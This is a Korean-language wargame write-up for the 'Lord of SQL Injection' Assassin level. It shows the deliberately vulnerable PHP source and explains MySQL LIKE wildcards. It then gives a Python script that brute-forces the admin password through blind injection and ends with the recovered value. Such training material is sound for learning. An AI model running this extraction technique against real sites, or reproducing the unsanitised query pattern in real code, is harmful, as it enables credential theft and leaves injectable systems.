# Lord of SQL Injection No.15 - Assassin
## 문제 출제 의도
1. MySQL의 와일드 카드 이해 여부 확인.
## 소스 코드
~~~
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("assassin"); 
    highlight_file(__FILE__); 
?>
~~~
## 분석 결론
+ 금지 문자, 문자열
    - Get 방식으로 받은 pw값에  '(single quote)가 있다면 "No Hack ~_~"이 출력되고 문제 풀이에 실패한다.
+ 풀이 성공 조건
    - 데이터베이스에서 받은 값이 'admin' 이면 문제 해결에 성공한다.
## 문제 해결
1. Blind SQL Injection.
    - LIKE 와일드 카드
        1. % =  ~%로 사용하면 ~까지 일치하는 문자열은 모두 해당된다. 즉 ~값만 같으면 %이후의 값은 중요하지 않다.
        2.  _ = 해당하는 글자만큼의 와일드카드이다. "_"를 사용한 만큼의 문자만 적용된다.
    - 다음과 유사한 코드를 이용하여 pw 값을 알아 낼 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote

    key = ""
    for i in range(1, 9):
        buf=chr(0)
        for j in range(48, 91):
            url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
            data = "{}%".format(key+chr(j))
            print(data)
            # data = quote(data)

            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
            re.add_header("Cookie", "PHPSESSID=3q0e1uadocute8g1nvp6u7l6k1")
            res = urllib.request.urlopen(re)
            result=str(res.read())

            if  result.find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                buf=str(1)
                break

            elif result.find("Hello guest") != -1:
                buf=chr(j).lower()

        if buf != str(1):
            key += buf
    print(key)
    ~~~
    - 이는 "832edd10"을 출력한다.
    - 이를 GET방식으로 pw에 입력하면 문제가 해결된다.